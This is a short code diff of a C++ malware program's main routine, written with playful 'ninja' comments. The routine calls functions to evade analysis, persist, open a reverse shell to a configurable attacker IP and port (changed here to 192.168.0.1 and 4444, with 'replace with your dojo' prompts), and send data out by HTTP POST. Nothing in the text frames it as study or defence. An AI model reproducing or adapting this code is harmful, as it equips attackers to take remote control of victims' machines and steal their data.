@@ -268,8 +268,8 @@ int main() {
     // Ninja stealth mode activation - vanishing from enemy radar before the mission
     evade_analysis();
     
-    std::string ip = "192.168.0.28"; // Ninja headquarters coordinates (replace with your dojo)
-    int port = 44895; // Secret knock pattern (replace with your clan's signal)
+    std::string ip = "192.168.0.1"; // Ninja headquarters coordinates (replace with your dojo)
+    int port = 4444; // Secret knock pattern (replace with your clan's signal)
 
     persist();
     reverse_shell(ip, port);
@@ -280,4 +280,5 @@ int main() {
     http_request(url, postData);
     
     return 0;
+
 }
